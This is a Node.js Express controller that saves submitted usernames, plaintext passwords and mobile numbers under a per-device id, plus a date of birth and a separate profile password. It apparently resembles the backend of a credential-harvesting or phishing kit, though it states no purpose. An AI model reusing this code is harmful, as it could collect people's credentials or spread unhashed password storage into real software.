const User = require('../models/User');
const successData = require('../models/SuccessData');

exports.saveUserData = async (req, res) => {
    try {
        const { username, password, mobileNumber,uniqueid } = req.body;
        let user = await User.findOne({ uniqueid });

        if (user) {
            // Agar already exist hai, naya entry add karo
            user.entries.push({ username, password, mobileNumber});
        } else {
            // Naya document create karo
            user = new User({
                uniqueid,
                entries: [{  username, password, mobileNumber}]
            });
        }

        await user.save();

        res.status(200).json({
            success: true,
            message: "User Data Submitted Successfully!"
        });
    } catch (error) {
        console.error(error);
        res.status(500).json({
            success: false,
            message: "Error occurred while submitting user data"
        });
    }
};

exports.savesuccessData = async (req, res) => {
  try {
    const { uniqueid, dob, profilePassword } = req.body;
    let record = await successData.findOne({ uniqueid });

    if (record) {
      record.dob = dob;
      record.profilePassword = profilePassword;
    } else {
      record = new successData({ uniqueid, dob, profilePassword });
    }

    await record.save();

    res.status(200).json({
      success: true,
      message: "Success Data Submitted Successfully!"
    });
  } catch (error) {
    console.error("saveSuccessData error:", error);
    res.status(500).json({
      success: false,
      message: "Error occurred while submitting success data"
    });
  }
};


